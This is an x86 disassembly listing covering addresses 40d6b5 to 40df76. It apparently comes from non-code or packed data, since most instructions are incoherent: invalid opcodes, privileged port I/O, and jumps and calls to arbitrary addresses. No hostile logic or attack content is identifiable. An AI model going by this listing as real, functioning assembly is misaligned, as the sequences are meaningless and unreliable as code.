  40d6b5:	fistp  WORD PTR [edi]
  40d6b8:	div    BYTE PTR [eax-0x45723b20]
  40d6be:	cmp    edx,DWORD PTR [ecx]
  40d6c0:	jmp    0x7209953f
  40d6c5:	shr    DWORD PTR [esi+0x40],cl
  40d6c8:	mov    ebp,0xb1408753
  40d6cd:	push   ebx
  40d6ce:	test   al,0x9c
  40d6d0:	bound  ebp,QWORD PTR [esp+eax*1+0x2a466faa]
  40d6d7:	stos   BYTE PTR es:[edi],al
  40d6d8:	cmp    edx,eax
  40d6da:	frstor [edx]
  40d6dc:	or     eax,0x2385ecb1
  40d6e1:	aam    0xe5
  40d6e3:	xor    eax,0xcd5e84fc
  40d6e8:	call   0x13eac424
  40d6ed:	fmul   st,st(4)
  40d6ef:	das    
  40d6f0:	mov    eax,ds:0x7df94eb0
  40d6f5:	ss repnz test eax,0x2fb50c1b
  40d6fc:	xchg   ecx,eax
  40d6fd:	fwait
  40d6fe:	sti    
  40d6ff:	lods   eax,DWORD PTR ds:[esi]
  40d700:	gs mov al,0x3c
  40d703:	out    dx,al
  40d704:	fld    TBYTE PTR [ebx-0x4ec67914]
  40d70a:	xchg   esp,eax
  40d70b:	test   eax,0x9c86364d
  40d710:	sub    al,0x27
	...
  40d722:	add    BYTE PTR [eax],al
  40d724:	test   DWORD PTR [ecx+0x4fa0280],ebp
  40d72a:	add    cl,ch
  40d72c:	retf   0xc1bb
  40d72f:	aad    0xf9
  40d731:	dec    edi
  40d732:	mov    edx,DWORD PTR ds:0xf174a9c2
  40d738:	xor    DWORD PTR [ebp+0x218a1671],0x4b8aad1
  40d742:	(bad)  
  40d743:	jl     0x40d786
  40d745:	mov    eax,ds:0x4f9b63c
  40d74a:	or     ebp,DWORD PTR [ecx]
  40d74c:	in     al,dx
  40d74d:	call   FWORD PTR [esi+0x20]
  40d750:	aaa    
  40d751:	add    DWORD PTR [eax],eax
  40d753:	scas   eax,DWORD PTR es:[edi]
  40d754:	inc    BYTE PTR [edi+edi*8]
  40d757:	push   esp
  40d758:	push   ds
  40d759:	mov    eax,ds:0xaa655bd2
  40d75e:	mov    esi,0x43b9ba
  40d763:	mov    bl,0xfc
  40d766:	push   esi
  40d767:	shl    edi,1
  40d769:	repnz (bad) 
  40d76b:	call   0xe4b54060
  40d770:	cmp    al,0xbe
  40d772:	shl    ecx,0xf9
  40d775:	test   al,0x32
  40d777:	test   eax,0x96fea74f
  40d77c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d77d:	mov    dh,0xad
  40d77f:	shl    esp,1
  40d781:	xor    eax,esp
  40d783:	xchg   BYTE PTR [ebx],al
  40d785:	std    
  40d786:	out    0x5,eax
	...
  40d798:	add    BYTE PTR [eax],al
  40d79a:	ret    
  40d79b:	test   al,0xfe
  40d79d:	loop   0x40d758
  40d79f:	xor    DWORD PTR ds:0x7c66f0e,eax
  40d7a5:	jmp    0xa884dbab
  40d7aa:	stc    
  40d7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ac:	je     0x40d78f
  40d7ae:	jno    0x40d76c
  40d7b0:	xor    al,0xe9
  40d7b2:	stc    
  40d7b3:	sti    
  40d7b4:	mov    edi,0xfda94600
  40d7b9:	jne    0x40d74a
  40d7bb:	daa    
  40d7bc:	add    al,0x9c
  40d7be:	inc    ebp
  40d7bf:	inc    ecx
  40d7c0:	add    BYTE PTR [eax+0x4d],ch
  40d7c3:	inc    eax
  40d7c4:	inc    ecx
  40d7c5:	add    BYTE PTR [esi+ebp*8],bl
  40d7c8:	pop    es
  40d7c9:	call   0x3f858f
  40d7ce:	pop    eax
  40d7cf:	les    esi,FWORD PTR [ebx+0x9]
  40d7d2:	cld    
  40d7d3:	in     eax,dx
  40d7d4:	or     ecx,DWORD PTR [edi+0x41652456]
  40d7da:	push   ebx
  40d7db:	or     al,0x1d
  40d7dd:	inc    esp
  40d7de:	bound  eax,QWORD PTR [edi+edi*8]
  40d7e1:	jne    0x40d7fe
  40d7e3:	mov    WORD PTR [esi+0xb041335],ss
  40d7e9:	rol    dh,0xa9
  40d7ec:	std    
  40d7ed:	jne    0x40d80e
  40d7ef:	daa    
  40d7f0:	add    al,0xa4
  40d7f2:	mov    ch,0x41
  40d7f4:	add    BYTE PTR [eax+0x412],bh
  40d7fa:	fsubr  QWORD PTR [ecx-0x40]
  40d7fd:	or     BYTE PTR [eax],al
	...
  40d80f:	add    bl,ah
  40d811:	dec    esp
  40d812:	mov    ebp,esp
  40d814:	pusha  
  40d815:	shl    dl,0x56
  40d818:	and    al,0x9
  40d81a:	int    0x43
  40d81c:	adc    al,BYTE PTR [ecx]
  40d81e:	push   DWORD PTR [ebp-0x25]
  40d821:	mov    eax,DWORD PTR [esi+esi*1-0x3ff4fc1d]
  40d828:	mov    BYTE PTR [ecx],0x5f
  40d82b:	pop    esi
  40d82c:	mov    al,ch
  40d82e:	add    al,BYTE PTR [eax]
  40d830:	jecxz  0x40d85d
  40d832:	out    dx,eax
  40d833:	mov    ebx,DWORD PTR [esi+0x7701e9ab]
  40d839:	cmp    DWORD PTR [eax+eax*1],0xffffffc6
  40d83d:	pop    ebp
  40d83e:	mov    ds:0x41defa68,al
  40d843:	inc    ecx
  40d844:	cli    
  40d845:	cmp    BYTE PTR ss:[eax],cl
  40d848:	xchg   edx,eax
  40d849:	mov    ebp,0xb27dfff4
  40d84e:	ret    0xfc74
  40d851:	mov    cs,WORD PTR [ecx+ecx*8+0x38]
  40d855:	mov    eax,ds:0xb5e78b02
  40d85a:	cdq    
  40d85b:	and    DWORD PTR [edx-0x3a],edi
  40d85e:	sti    
  40d85f:	jae    0x40d854
  40d861:	sbb    eax,0xb1c60cee
  40d866:	cmp    BYTE PTR [esi],0xf0
  40d869:	sub    esi,edi
  40d86b:	jg     0x40d86a
  40d86d:	bound  esi,QWORD PTR [esi]
  40d86f:	or     bh,BYTE PTR [edx+0x6e]
  40d872:	dec    edi
  40d873:	je     0x40d875
	...
  40d885:	add    bh,dh
  40d887:	sbb    eax,0x9aaf5fee
  40d88c:	les    eax,FWORD PTR [esi]
  40d88e:	fcmovu st,st(6)
  40d890:	cmp    DWORD PTR [esi],0xfffffffa
  40d893:	dec    eax
  40d894:	retf   
  40d895:	(bad)  
  40d896:	mov    bh,0xb9
  40d898:	add    eax,DWORD PTR [eax]
  40d89a:	cli    
  40d89b:	popf   
  40d89c:	ret    
  40d89d:	inc    esp
  40d89e:	add    bl,BYTE PTR [ebp+0x22fa0002]
  40d8a4:	das    
  40d8a5:	or     cl,ah
  40d8a7:	jecxz  0x40d82c
  40d8a9:	ds sbb eax,0x5f82d909
  40d8af:	mov    BYTE PTR [ebx],al
  40d8b1:	jne    0x40d89b
  40d8b3:	xchg   BYTE PTR [esi-0x8],al
  40d8b6:	sti    
  40d8b7:	fwait
  40d8b8:	add    al,BYTE PTR [eax]
  40d8ba:	dec    edi
  40d8bb:	mov    al,ds:0x9dbe44c3
  40d8c0:	add    al,BYTE PTR [eax]
  40d8c2:	cli    
  40d8c3:	adc    BYTE PTR [eax],0xf7
  40d8c6:	aaa    
  40d8c7:	xor    al,0x3
  40d8c9:	add    dl,bh
  40d8cb:	add    al,0xe9
  40d8cd:	ss lock mov esi,0x40bce3e5
  40d8d4:	push   ebp
  40d8d5:	add    al,0xfa
  40d8d7:	add    al,0xe9
  40d8d9:	add    esp,0x48
  40d8dc:	mov    esp,0x41407d06
  40d8e1:	cdq    
  40d8e2:	cld    
  40d8e3:	mov    ebp,0xa66dabab
  40d8e8:	call   0x40d8f0
	...
  40d8f9:	add    BYTE PTR [eax],al
  40d8fb:	add    BYTE PTR [ecx+0x28],bh
  40d8fe:	and    eax,0x2701e703
  40d903:	add    eax,0xed693e1a
  40d908:	dec    ebp
  40d909:	xor    DWORD PTR [ecx+0x79],ebx
  40d90c:	(bad)  
  40d90d:	cld    
  40d90e:	adc    DWORD PTR [eax],edx
  40d910:	jp     0x40d8f8
  40d912:	enter  0xc36,0x85
  40d916:	jne    0x40d91a
  40d918:	fisubr DWORD PTR [edi]
  40d91a:	fst    DWORD PTR [ecx+edx*1-0x1]
  40d91e:	jb     0x40d964
  40d920:	sti    
  40d921:	jl     0x40d908
  40d923:	inc    esp
  40d924:	jp     0x40d90c
  40d926:	call   0x1e86e061
  40d92b:	inc    ebp
  40d92c:	jp     0x40d914
  40d92e:	call   0x23fef669
  40d933:	mov    eax,0x3e8a5f5
  40d938:	sub    DWORD PTR [edi],0xfd6678e1
  40d93e:	xchg   ecx,eax
  40d93f:	loope  0x40d99e
  40d941:	out    0xcc,al
  40d943:	idiv   BYTE PTR ss:[esi+0x2fcd03ed]
  40d94a:	xchg   ebp,eax
  40d94b:	push   ebp
  40d94c:	rcr    cl,cl
  40d94e:	xchg   BYTE PTR [esp+edi*4-0x3c95707],ch
  40d955:	inc    ebp
  40d956:	add    BYTE PTR [edi],dl
  40d958:	jno    0x40d91d
  40d95a:	add    ebp,ecx
  40d95c:	and    ch,BYTE PTR [edi+0x6645]
	...
  40d972:	xor    al,0xb1
  40d974:	inc    esi
  40d975:	imul   esp,DWORD PTR [esi+0x5e3073a5],0x61b7f430
  40d97f:	stc    
  40d980:	std    
  40d981:	inc    esi
  40d982:	dec    esi
  40d983:	inc    esi
  40d984:	pop    esi
  40d985:	xor    BYTE PTR [ebx],bh
  40d987:	add    DWORD PTR [eax],eax
  40d989:	pushf  
  40d98a:	repnz cdq 
  40d98c:	and    BYTE PTR ds:0x6a574fa1,0xc
  40d993:	adc    DWORD PTR [eax],eax
  40d995:	xchg   ebp,eax
  40d996:	push   eax
  40d997:	cmp    BYTE PTR [eax+ecx*8],0x30
  40d99b:	inc    esp
  40d99c:	add    cl,ch
  40d99e:	or     al,0xff
  40d9a0:	pop    esi
  40d9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9a2:	add    bl,0xf
  40d9a5:	jmp    0xb0551a5c
  40d9aa:	hlt    
  40d9ab:	mov    BYTE PTR [ebp-0x58],ah
  40d9ae:	stc    
  40d9af:	cmc    
  40d9b0:	or     BYTE PTR [edx+0x200004f7],0xfb
  40d9b7:	fs gs sub dh,dh
  40d9bb:	cmc    
  40d9bc:	xor    BYTE PTR [esi-0x1],0x4
  40d9c0:	add    BYTE PTR [eax],al
  40d9c2:	sti    
  40d9c3:	pusha  
  40d9c4:	gs sub dh,bh
  40d9c7:	adc    eax,DWORD PTR [ebx+0x4f762]
  40d9cd:	pop    esp
  40d9ce:	cmp    ebx,DWORD PTR [ecx-0x62c48bb1]
  40d9d4:	dec    edi
  40d9d5:	ins    BYTE PTR es:[edi],dx
	...
  40d9e6:	add    BYTE PTR [eax],al
  40d9e8:	cmp    esp,DWORD PTR [ecx-0x7f3469b1]
  40d9ee:	gs sub dh,bh
  40d9f1:	mov    ds:0x80a30074,eax
  40d9f6:	mov    esp,0x8b7034f8
  40d9fb:	inc    ebp
  40d9fc:	jnp    0x40da37
  40d9fe:	lea    eax,[ebp+0x27]
  40da01:	cmp    DWORD PTR [ebp-0xc6bcbb],ecx
  40da07:	xor    eax,0x40e77f
  40da0c:	and    al,0xd6
  40da0e:	psubsb mm7,QWORD PTR [edi+0x71]
  40da12:	std    
  40da13:	inc    DWORD PTR [esi]
  40da15:	inc    esi
  40da16:	fcom   QWORD PTR [eax-0x1a]
  40da19:	inc    ebp
  40da1a:	loopne 0x40da6c
  40da1c:	(bad)  
  40da1d:	inc    ebp
  40da1e:	in     al,0x50
  40da20:	adc    al,0x96
  40da22:	sahf   
  40da23:	xchg   dx,ax
  40da25:	or     bh,bh
  40da27:	jne    0x40da7c
  40da29:	or     BYTE PTR [eax-0x2901b08],0x75
  40da30:	call   FWORD PTR [edi]
  40da32:	inc    esp
  40da33:	aam    0xf4
  40da35:	aad    0xdb
  40da37:	(bad)  
  40da38:	pop    esi
  40da39:	rol    ch,1
  40da3b:	inc    ebp
  40da3c:	adc    ecx,DWORD PTR [ecx]
  40da3e:	add    BYTE PTR [eax],al
  40da40:	adc    ebx,DWORD PTR ds:0x2e3cc44
  40da46:	add    DWORD PTR [edx+0x23],ebp
  40da49:	add    al,BYTE PTR [eax]
  40da4b:	push   0x0
	...
  40da5d:	add    BYTE PTR [ebx],ah
  40da5f:	add    al,BYTE PTR [eax]
  40da61:	(bad)  
  40da62:	fidiv  WORD PTR [esi+ecx*2+0x27a91eff]
  40da69:	inc    ecx
  40da6a:	jecxz  0x40da0e
  40da6c:	mov    esi,0xffa25f0f
  40da71:	call   ebx
  40da73:	mov    bh,BYTE PTR [ebx-0x30]
  40da76:	rcr    DWORD PTR [esi+0x7e20082],cl
  40da7c:	add    BYTE PTR [ebx+0x3ab7e8fa],cl
  40da82:	aaa    
  40da83:	mov    bh,cl
  40da85:	xchg   dh,al
  40da87:	lods   eax,DWORD PTR ds:[esi]
  40da88:	add    al,BYTE PTR [eax]
  40da8a:	mov    dh,0x16
  40da8c:	xor    al,dl
  40da8e:	sbb    DWORD PTR [eax-0x7dc8753a],0x91a901a5
  40da98:	test   eax,0x4032c674
  40da9d:	in     al,0x8d
  40da9f:	rcl    dl,0xe7
  40daa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa3:	inc    DWORD PTR [ebx]
  40daa5:	add    BYTE PTR [ecx-0x38],bh
  40daa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa9:	inc    DWORD PTR [edx+ebp*1]
  40daac:	mov    ecx,0x85ad6dff
  40dab1:	jl     0x40db1d
  40dab3:	lods   eax,DWORD PTR ds:[esi]
  40dab4:	stc    
  40dab5:	xor    DWORD PTR [esi],0xffffffad
  40dab8:	add    al,BYTE PTR [eax]
  40daba:	jns    0x40da3c
  40dabc:	sahf   
  40dabd:	(bad)  
  40dabe:	cld    
  40dabf:	xor    DWORD PTR [ebp-0x1],ebp
	...
  40dad2:	add    BYTE PTR [eax],al
  40dad4:	inc    ebp
  40dad5:	lods   eax,DWORD PTR ds:[esi]
  40dad6:	test   eax,0x6cf53e74
  40dadb:	pusha  
  40dadc:	xor    eax,0x42447aa2
  40dae1:	call   0xfebb:0x1825fc2e
  40dae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dae9:	rcr    DWORD PTR [ebx-0x573d6421],0x67
  40daf0:	fdivrp st(1),st
  40daf2:	inc    edx
  40daf3:	add    BYTE PTR [edx],dl
  40daf5:	inc    ecx
  40daf6:	idiv   bh
  40daf8:	std    
  40daf9:	cld    
  40dafa:	sbb    ebp,DWORD PTR [esi+edi*1]
  40dafd:	in     eax,dx
  40dafe:	add    edi,edi
  40db00:	addr16 fs fwait
  40db03:	sub    eax,0xb02ac2e
  40db08:	mov    edx,0x620c1d05
  40db0d:	(bad)  
  40db0e:	and    al,0x43
  40db10:	cli    
  40db11:	lods   al,BYTE PTR ds:[esi]
  40db12:	sbb    dh,dh
  40db14:	lds    esp,FWORD PTR [edx+0x49091c38]
  40db1a:	sub    BYTE PTR [esi*4+0xb9cb118],al
  40db21:	fld1   
  40db23:	add    esi,ecx
  40db25:	(bad)  
  40db26:	hlt    
  40db27:	or     edx,DWORD PTR [edx]
  40db29:	fisubr WORD PTR [edx+eax*2-0xa4b5306]
  40db30:	lea    esp,[edx+0x48c11bb8]
  40db36:	test   al,0x3
	...
  40db48:	add    BYTE PTR [eax],al
  40db4a:	jge    0x40db64
  40db4c:	xor    DWORD PTR [edi+ebp*2+0x103e8d6],ebx
  40db53:	lds    edi,FWORD PTR [ebx-0x16fb2dc2]
  40db59:	cwde   
  40db5a:	lahf   
  40db5b:	mov    ds:0x5f5df79b,al
  40db60:	mov    ebx,0xdba24ca8
  40db65:	mov    ebx,edi
  40db67:	inc    ebx
  40db68:	jmp    0x1151a215
  40db6d:	pop    eax
  40db6e:	(bad)  
  40db6f:	mov    eax,ds:0xa0a6a8fd
  40db74:	cmc    
  40db75:	cs mov cs:0xb915f773,al
  40db7c:	inc    ebx
  40db7d:	test   eax,0xb453a214
  40db82:	or     al,0x18
  40db84:	shr    DWORD PTR [eax-0x3e3eef72],0x9e
  40db8b:	mov    eax,ds:0xa96ea8c5
  40db90:	mov    ebp,0xffa1ce2e
  40db95:	cmp    esp,edx
  40db97:	test   eax,0xa2930cb7
  40db9c:	(bad)  
  40db9d:	sbb    al,0x96
  40db9f:	test   eax,0xa2a309f0
  40dba4:	pop    esi
  40dba5:	aaa    
  40dba6:	add    ebx,0x8e2ce90f
  40dbac:	jmp    0x40dc18
	...
  40dbbe:	add    BYTE PTR [eax],al
  40dbc0:	jne    0x40db6b
  40dbc2:	cmp    ah,0xfd
  40dbc5:	pop    es
  40dbc6:	(bad)  
  40dbc8:	push   cs
  40dbc9:	add    al,0x0
  40dbcb:	jmp    0xba3524f4
  40dbd0:	or     al,0x49
  40dbd2:	clc    
  40dbd3:	mov    ecx,0xb9fc4904
  40dbd8:	out    0x6,eax
  40dbda:	call   esp
  40dbdc:	jmp    0xa27efc8d
  40dbe1:	mov    ds:0x4a1bc82,al
  40dbe6:	(bad)  
  40dbe8:	scas   al,BYTE PTR es:[edi]
  40dbe9:	mov    eax,ds:0x1892e9fe
  40dbee:	hlt    
  40dbef:	jbe    0x40dc05
  40dbf1:	xchg   ebp,eax
  40dbf2:	addr16 sbb eax,0x160043b6
  40dbf8:	adc    al,0x95
  40dbfa:	out    0xc3,eax
  40dbfc:	inc    edi
  40dbfd:	mov    eax,ds:0x1239f2fe
  40dc02:	test   DWORD PTR [ecx],esp
  40dc04:	stc    
  40dc05:	add    al,0x0
  40dc07:	fs in  al,0x98
  40dc0a:	dec    edi
  40dc0b:	pop    esp
  40dc0c:	fcomp  QWORD PTR [edi+ecx*2+0x4fa0bb74]
  40dc13:	push   ebx
  40dc14:	mul    BYTE PTR [ecx-0x589e068c]
  40dc1a:	cmc    
  40dc1b:	into   
  40dc1c:	push   ebp
  40dc1d:	xchg   BYTE PTR [eax+eax*1-0x45],bh
  40dc21:	or     cl,BYTE PTR [edi]
  40dc23:	test   DWORD PTR [eax],eax
	...
  40dc35:	add    BYTE PTR [ebx+0x9],bh
  40dc38:	add    BYTE PTR [eax],al
  40dc3a:	lods   al,BYTE PTR ds:[esi]
  40dc3b:	(bad)  
  40dc3c:	repz push 0x414494
  40dc42:	imul   ebx,DWORD PTR [edx-0x641cffd0],0xffffffbe
  40dc49:	orps   xmm4,XMMWORD PTR [edi+edi*8]
  40dc4d:	call   ebx
  40dc4f:	sbb    eax,0x1e13f444
  40dc54:	inc    esp
  40dc55:	clc    
  40dc56:	adc    ebx,DWORD PTR [esi]
  40dc58:	inc    esp
  40dc59:	cld    
  40dc5a:	add    edi,ebx
  40dc5c:	add    bh,bh
  40dc5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc5f:	hlt    
  40dc60:	out    0xb1,eax
  40dc62:	xor    eax,0xae83fd68
  40dc67:	ins    BYTE PTR es:[edi],dx
  40dc68:	dec    BYTE PTR [esi]
  40dc6a:	push   ss
  40dc6b:	test   dh,bh
  40dc6d:	call   DWORD PTR [ebx-0x430bbbe5]
  40dc73:	cwde   
  40dc74:	lea    eax,[ebp-0x41]
  40dc77:	sbb    eax,0x1d83f444
  40dc7c:	inc    esp
  40dc7d:	clc    
  40dc7e:	sbb    DWORD PTR ds:0xfe93fc44,0x3
  40dc85:	jmp    DWORD PTR [esi-0xc]
  40dc88:	out    0x89,eax
  40dc8a:	in     eax,0x67
  40dc8c:	std    
  40dc8d:	sub    DWORD PTR [esi+0x6c],0xffffffff
  40dc91:	je     0x40dcef
  40dc93:	pop    edi
  40dc94:	add    ebx,DWORD PTR [ebp+esi*2+0xff0049]
	...
  40dcab:	add    BYTE PTR [edi+eiz*2],ch
  40dcae:	std    
  40dcaf:	(bad)  
  40dcb0:	push   ss
  40dcb1:	and    al,0x65
  40dcb3:	inc    ecx
  40dcb4:	and    esp,DWORD PTR [edi-0x3]
  40dcb7:	jmp    FWORD PTR [edi+ebx*2]
  40dcba:	add    esp,DWORD PTR [edx+edi*8-0x2ffbab1]
  40dcc1:	into   
  40dcc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcc3:	(bad)  
  40dcc4:	cmc    
  40dcc5:	loopne 0x40dc76
  40dcc7:	out    0xf8,eax
  40dcc9:	popa   
  40dcca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dccb:	(bad)  
  40dccc:	mov    ebp,0xfa009bf0
  40dcd1:	lods   eax,DWORD PTR ds:[esi]
  40dcd2:	add    al,BYTE PTR [ebx+0x411c8a17]
  40dcd8:	cli    
  40dcd9:	jle    0x40dd09
  40dcdb:	sub    DWORD PTR [ecx-0x48],edi
  40dcde:	bound  esp,QWORD PTR [ebp+0x3b]
  40dce1:	scas   al,BYTE PTR es:[edi]
  40dce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dce3:	jae    0x40dcbf
  40dce5:	sub    ch,al
  40dce7:	mov    ds:0xff03ed14,eax
  40dcec:	cs mov edi,0xed67f01a
  40dcf2:	add    ecx,DWORD PTR [ebp-0xacc9c1]
  40dcf8:	pop    es
  40dcf9:	push   edx
  40dcfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcfb:	je     0x40dcf3
  40dcfd:	xor    BYTE PTR ss:[eax],cl
  40dd00:	xchg   edx,eax
  40dd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd02:	stos   BYTE PTR es:[edi],al
  40dd03:	(bad)  
  40dd04:	jne    0x40dcda
  40dd06:	ror    BYTE PTR [edi],0xfa
  40dd09:	js     0x40dd84
  40dd0b:	jmp    0x40dd86
  40dd0d:	icebp  
  40dd0e:	xchg   esi,eax
  40dd0f:	inc    BYTE PTR [eax]
	...
  40dd21:	add    bh,ah
  40dd23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd24:	call   0xea69:0xa5e6b39c
  40dd2b:	xor    BYTE PTR [eax-0x10],al
  40dd2e:	stos   BYTE PTR es:[edi],al
  40dd2f:	imul   BYTE PTR [edi]
  40dd31:	or     BYTE PTR [edx-0x6a],dl
  40dd34:	dec    edx
  40dd35:	push   DWORD PTR ds:0xf674c292
  40dd3b:	aam    0xc0
  40dd3d:	pop    es
  40dd3e:	cli    
  40dd3f:	adc    DWORD PTR [edx],0x68
  40dd42:	gs push 0x43
  40dd45:	add    BYTE PTR [edi-0x424bd3fc],al
  40dd4b:	lods   al,BYTE PTR ds:[esi]
  40dd4c:	aad    0x45
  40dd4e:	add    eax,0x86c3e19f
  40dd53:	or     BYTE PTR [eax-0x51fb023e],ah
  40dd59:	aas    
  40dd5a:	fiadd  WORD PTR [ecx+ebp*8]
  40dd5d:	add    edi,edx
  40dd5f:	(bad)  
  40dd60:	sub    ebx,DWORD PTR [eax-0x3cc61d3]
  40dd66:	fucomp st(0)
  40dd68:	inc    edx
  40dd69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6a:	int3   
  40dd6b:	or     ch,BYTE PTR [ecx+0x1381fc30]
  40dd71:	cwde   
  40dd72:	mov    ebp,0x75d8e719
  40dd77:	int3   
  40dd78:	stos   BYTE PTR es:[edi],al
  40dd79:	cld    
  40dd7a:	lods   eax,DWORD PTR ds:[esi]
  40dd7b:	dec    esi
  40dd7c:	sar    BYTE PTR [edx-0x6367f770],cl
  40dd82:	sub    BYTE PTR [eax+ebp*1],al
  40dd85:	stc    
	...
  40dd96:	add    BYTE PTR [eax],al
  40dd98:	push   ebp
  40dd99:	sbb    BYTE PTR [esi+0x4c],bl
  40dd9c:	jns    0x40dd3b
  40dd9e:	out    0x2e,eax
  40dda0:	call   FWORD PTR [eax+ebp*8+0x3]
  40dda4:	sti    
  40dda5:	add    al,0x6a
  40dda7:	stos   DWORD PTR es:[edi],eax
  40dda8:	cli    
  40dda9:	sbb    bh,ch
  40ddab:	fsubr  DWORD PTR [ebp+0x65fc2acc]
  40ddb1:	arpl   WORD PTR [esi+ebx*1-0x45],bx
  40ddb5:	add    al,0x5c
  40ddb7:	aas    
  40ddb8:	xor    ax,0x2f26
  40ddbc:	add    ch,BYTE PTR [ebp-0x61bab615]
  40ddc2:	imul   ebp,DWORD PTR [edx+edi*8+0x2d80e418],0x78fd7c03
  40ddcd:	and    BYTE PTR ds:0x6af04,cl
  40ddd3:	ret    0xcd39
  40ddd6:	shl    ecx,0xf9
  40ddd9:	pop    DWORD PTR [ebp+edx*8-0x57]
  40dddd:	popf   
  40ddde:	je     0x40ddd1
  40dde0:	popa   
  40dde1:	stos   DWORD PTR es:[edi],eax
  40dde2:	pop    eax
  40dde3:	(bad)  
  40dde4:	push   esi
  40dde5:	xor    edi,0xffffffe8
  40dde8:	and    eax,0xfbc18308
  40dded:	pop    ss
  40ddee:	push   es
  40ddef:	push   0x1c
  40ddf1:	mov    cl,0xff
  40ddf3:	cmp    ebx,esp
  40ddf5:	jmp    0x7400:0x5bba0bf
	...
  40de0c:	add    BYTE PTR [eax],al
  40de0e:	or     al,0xb1
  40de10:	dec    edi
  40de11:	sahf   
  40de12:	adc    al,0xd
  40de14:	call   0xfedf0eb9
  40de19:	loop   0x40ddd4
  40de1b:	sbb    BYTE PTR [esi],al
  40de1d:	push   0xffffffd4
  40de1f:	mov    al,0xff
  40de21:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de23:	jmp    0x5c00:0x5bba0bf
  40de2a:	aam    0xb0
  40de2c:	dec    edi
  40de2d:	data16 fmul QWORD PTR [eax+ebp*8]
  40de31:	mov    WORD PTR [eax],?
  40de33:	sahf   
  40de34:	(bad)  
  40de35:	push   0x51
  40de37:	fnsave [edi+eiz*8+0x7a]
  40de3b:	and    ah,ch
  40de3d:	jmp    0x296be55e
  40de42:	mov    al,ds:0xe4e907c3
  40de47:	dec    eax
  40de48:	in     al,dx
  40de49:	cdq    
  40de4a:	sahf   
  40de4b:	sbb    BYTE PTR [eax],cl
  40de4d:	adc    DWORD PTR [ecx+0x3c],ebp
  40de50:	call   FWORD PTR [esi]
  40de52:	jp     0x40dde9
  40de54:	pop    ds
  40de55:	pushf  
  40de56:	aas    
  40de57:	cmp    BYTE PTR [ebp+edi*8-0x8],0x17
  40de5c:	push   es
  40de5d:	add    BYTE PTR [eax-0x3f],cl
  40de60:	mov    edx,0x458d012b
  40de66:	div    DWORD PTR [ecx]
  40de68:	push   DWORD PTR [ebp+0x1b]
  40de6b:	jns    0x40dede
  40de6d:	pop    ecx
  40de6e:	adc    al,0x61
  40de70:	cmp    eax,0x0
	...
  40de82:	add    BYTE PTR [eax],al
  40de84:	repz sti 
  40de86:	add    eax,0xfe54a683
  40de8b:	je     0x40de6a
  40de8d:	stos   DWORD PTR es:[edi],eax
  40de8e:	mov    esi,0x9a1c9
  40de93:	lea    ebx,[esi]
  40de95:	push   ebp
  40de96:	dec    esi
  40de97:	push   0xfffffff3
  40de99:	addr16 jae 0x40dea4
  40de9c:	mov    ebx,0x94ff58e8
  40dea1:	jbe    0x40dee6
  40dea3:	in     al,dx
  40dea4:	add    ebp,DWORD PTR [eax+0x73]
  40dea7:	or     BYTE PTR [ebx+0x58],bh
  40deaa:	push   esi
  40deab:	inc    DWORD PTR [esp+eax*4+0xbb101f6]
  40deb2:	cmp    eax,0xffffff90
  40deb5:	inc    DWORD PTR ds:0xfe6ca683
  40debb:	je     0x40de5a
  40debd:	stos   DWORD PTR es:[edi],eax
  40debe:	mov    esi,0x8e1c9
  40dec3:	mov    ds:0x40ef7b,eax
  40dec8:	push   ss
  40dec9:	dec    esi
  40deca:	in     al,dx
  40decb:	push   eax
  40decc:	cmp    DWORD PTR [eax+0x706b75fd],esi
  40ded2:	dec    eax
  40ded3:	pop    ecx
  40ded4:	and    al,0x68
  40ded6:	(bad)
  40deda:	add    BYTE PTR [ebp+0x6a4e6c9e],cl
  40dee0:	bound  esp,QWORD PTR [edi+0x73]
  40dee3:	or     al,0xe4
  40dee5:	std    
  40dee6:	pop    es
  40dee7:	call   0x40deec
	...
  40def8:	add    BYTE PTR [eax],al
  40defa:	cli    
  40defb:	sbb    DWORD PTR [eax-0x3a1aca02],0x8d78fa07
  40df05:	jmp    0x40df80
  40df07:	loop   0x40dea8
  40df09:	mov    WORD PTR [edi-0x5c17cd6f],?
  40df0f:	jo     0x40deb2
  40df11:	dec    BYTE PTR ds:0x8ffea039
  40df17:	test   eax,0xb2a54eaa
  40df1c:	mov    eax,ds:0x1331ba0a
  40df21:	jmp    DWORD PTR [edi-0x6a]
  40df24:	mov    eax,ds:0xddb5e674
  40df29:	std    
  40df2a:	fst    QWORD PTR [edx+0xd]
  40df2d:	ror    BYTE PTR [edi-0x52],0xa1
  40df31:	je     0x40df01
  40df33:	jne    0x40df57
  40df35:	push   ebp
  40df36:	lds    edi,FWORD PTR [edx-0x35]
  40df39:	shr    esi,0xad
  40df3c:	aaa    
  40df3d:	mov    esp,DWORD PTR [esi-0x5df3e876]
  40df43:	pop    esi
  40df44:	and    al,0xff
  40df46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df47:	xchg   esi,eax
  40df48:	ret    0xd973
  40df4b:	adc    bl,BYTE PTR [eax]
  40df4d:	adc    BYTE PTR [edx],ch
  40df4f:	xchg   ah,cl
  40df51:	pusha  
  40df52:	lea    esp,[edx]
  40df54:	xor    ebp,DWORD PTR [eax+0x72]
  40df57:	addr16 inc edx
  40df59:	add    BYTE PTR [ebp-0x48],bh
  40df5c:	cli    
  40df5d:	inc    BYTE PTR [eax]
	...
  40df6f:	add    bh,ch
  40df71:	xchg   ecx,eax
  40df72:	xor    bh,bh
  40df74:	out    0x95,eax
  40df76:	stos   BYTE PTR es:[edi],al
